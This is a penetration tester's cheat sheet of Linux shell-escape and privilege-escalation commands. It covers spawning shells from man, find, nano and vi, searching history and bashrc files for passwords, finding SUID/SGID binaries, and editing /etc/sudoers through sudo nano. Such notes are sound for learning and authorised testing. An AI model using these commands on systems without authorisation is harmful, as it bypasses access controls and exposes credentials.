# Commands to Shell

[https://gtfobins.github.io/](https://gtfobins.github.io/)

## man

``` bash 
man nikto
```

### Spawn shell

In Manual page, we can execute `!/bin/bash` to spawn a shell.

``` bash
NIKTO(1)

NAME
       <snip>
           2 - Show cookies received
 Manual page nikto(1) line 1 (press h for help or q to quit)!/bin/bash
```

``` bash
┌──(Hades㉿192.168.11.130)-[11.8:13.3]~
└─$ man nikto
┌──(kali㉿kali)-[~]
└─$ 
```

### Searching commands

``` bash
┌──(Hades㉿192.168.11.130)-[0.9:13.5]~
└─$ man -k '^passwd$'
passwd (1)           - change user password
passwd (1ssl)        - compute password hashes
passwd (5)           - the password file
                                                                                                                                                                            
┌──(Hades㉿192.168.11.130)-[0.9:13.6]~
└─$ man -k passwd      
chgpasswd (8)        - update group passwords in batch mode
chpasswd (8)         - update passwords in batch mode
<snip>
update-passwd (8)    - safely update /etc/passwd, /etc/shadow and /etc/group
vncpasswd (1)        - set passwords for VNC server
```

## find

``` bash
find / -name "<name>"
```

### Check history, bashrc, backup

``` bash
find / -name *history* 2>/dev/null
find / -name *bashrc* -exec grep passwod {} \; 2>/dev/null
```

### Binaries That AutoElevate

``` bash
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
```

### Spawn shell

``` bash
find . -exec /bin/sh \;
```

## Editing Files

### nano spawn shell

``` bash
nano
^R^X
reset; sh 1>&0 2>&0
```

``` bash
sudo nano /var/opt/../../etc/sudoers
```

### vi spawn shell

``` bash
vi -c ':!/bin/sh' /dev/null
```

``` bash
vi
:set shell=/bin/sh
:shell
```